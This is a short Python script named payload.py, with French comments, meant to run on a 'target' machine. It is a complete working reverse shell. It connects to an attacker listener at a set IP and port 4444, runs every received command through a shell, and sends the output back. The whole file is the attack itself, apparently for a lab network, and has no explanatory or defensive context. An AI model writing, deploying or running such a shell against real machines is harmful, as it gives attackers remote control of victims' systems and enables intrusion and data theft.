# payload.py (à exécuter sur la machine "cible")
import socket
import subprocess

ATTACKER_IP = '192.168.56.1'  # Remplace par l'IP du listener
PORT = 4444

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ATTACKER_IP, PORT))

while True:
    cmd = s.recv(1024).decode()
    if cmd.lower() == "exit":
        break
    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
    except subprocess.CalledProcessError as e:
        output = e.output
    s.sendall(output)

s.close()
